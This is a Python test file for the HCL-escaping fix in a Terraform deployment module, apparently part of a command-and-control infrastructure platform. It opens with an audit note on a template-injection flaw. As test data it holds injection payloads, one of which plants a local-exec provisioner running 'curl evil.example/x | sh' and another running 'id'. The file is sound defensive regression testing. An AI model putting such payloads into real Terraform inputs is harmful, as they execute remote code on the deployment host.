"""
Security audit finding (2026-08-30, P2 template-injection review):
TerraformMethod._generate_tf built .tf source via raw f-string
interpolation of admin-supplied plan/region/image and stored provider
credentials, with zero escaping. A crafted value could break out of an
HCL string literal and inject an arbitrary resource block — including a
`null_resource` with a `local-exec` provisioner, which `terraform apply`
then runs as a shell command on the backend host.

Exploitability note: only platform admins can set these values (stack
deploy is gated by `_admin(user)` in routers/infra_v2_api.py) — this is
hardening for an already-trusted actor, not a privilege escalation, but
the injection itself was real and is fixed the same way regardless.
"""

import pytest

# Enterprise-only: this module imports app.ee at import time, so in a
# Community tree (where the package is removed by scripts/build-ce.sh)
# there is nothing to test rather than something failing. Declared here
# instead of in a list in conftest, so a module that stops depending on
# the Enterprise package can drop the line with it.
pytest.importorskip("app.ee", reason="Enterprise Edition package not in this build")

from app.ee.infra.deploy_method import DeployContext, DeployTarget
from app.ee.infra.methods.terraform_method import TerraformMethod, _hcl_ident, _hcl_string


class TestHclString:
    def test_escapes_quote_and_backslash(self):
        assert _hcl_string('a"b\\c') == 'a\\"b\\\\c'

    def test_escapes_dollar_and_percent_interpolation_syntax(self):
        # HCL evaluates ${...} / %{...} even inside an otherwise-safe
        # quoted string literal — must be neutralized separately from
        # quote-escaping.
        assert _hcl_string("${evil}") == "$${evil}"
        assert _hcl_string("%{if true}x%{endif}") == "%%{if true}x%%{endif}"

    def test_newline_collapsed_to_escape_sequence(self):
        result = _hcl_string('a\nresource "null_resource" "x" {}')
        assert "\n" not in result
        assert "\\n" in result


class TestHclIdent:
    def test_strips_invalid_characters(self):
        assert _hcl_ident('c2" {\n}\nresource "evil') == "c2resourceevil"

    def test_falls_back_when_empty_after_stripping(self):
        assert _hcl_ident('"""') == "res"

    def test_leaves_valid_identifier_untouched(self):
        assert _hcl_ident("redirector-01") == "redirector-01"


class TestGenerateTfInjectionNeutralized:
    def _ctx(self, role="c2"):
        return DeployContext(
            stack_id="stk12345678",
            stack_name="Test Stack",
            service_id="svc1",
            service_name="test-svc",
            role=role,
            image="umbryx/adaptix:latest",
        )

    def _target(self, creds=None):
        return DeployTarget(provider_type="hetzner", credentials=creds or {"api_token": "tok"})

    def test_malicious_plan_cannot_break_out_of_string_literal(self):
        payload = 'cx22" }\nresource "null_resource" "pwned" {\n  provisioner "local-exec" {\n    command = "curl evil.example/x | sh"\n  }\n}\nresource "hcloud_server" "x" {\n  name = "y'
        method = TerraformMethod()
        tf = method._generate_tf(self._ctx(), self._target(), {"plan": payload})

        # The raw payload must never appear verbatim — proof it went
        # through escaping rather than being interpolated as-is.
        assert payload not in tf
        # The injected resource block must not appear as its own
        # unescaped top-level construct.
        assert '\nresource "null_resource" "pwned" {\n' not in tf
        assert 'provisioner "local-exec"' not in tf
        # The escaped form of the payload is present instead.
        assert _hcl_string(payload) in tf

    def test_malicious_role_cannot_break_resource_or_output_blocks(self):
        payload = 'c2" {\n}\nresource "null_resource" "pwned" {\n  provisioner "local-exec" {\n    command = "id"\n  }\n}\nresource "hcloud_server" "x'
        method = TerraformMethod()
        tf = method._generate_tf(self._ctx(role=payload), self._target(), {})

        assert 'provisioner "local-exec"' not in tf
        assert '\nresource "null_resource" "pwned" {\n' not in tf

    def test_malicious_credential_cannot_break_provider_block(self):
        payload = 'tok" }\nprovider "evil" {\n  x = "y'
        method = TerraformMethod()
        tf = method._generate_tf(self._ctx(), self._target(creds={"api_token": payload}), {})

        assert payload not in tf
        assert 'provider "evil"' not in tf
        assert _hcl_string(payload) in tf

    def test_benign_values_render_normally(self):
        method = TerraformMethod()
        tf = method._generate_tf(
            self._ctx(), self._target(), {"plan": "cx22", "region": "fsn1", "image": "ubuntu-22.04"}
        )
        assert 'server_type = "cx22"' in tf
        assert 'location    = "fsn1"' in tf
        assert 'image       = "ubuntu-22.04"' in tf
        assert 'resource "hcloud_server" "c2"' in tf
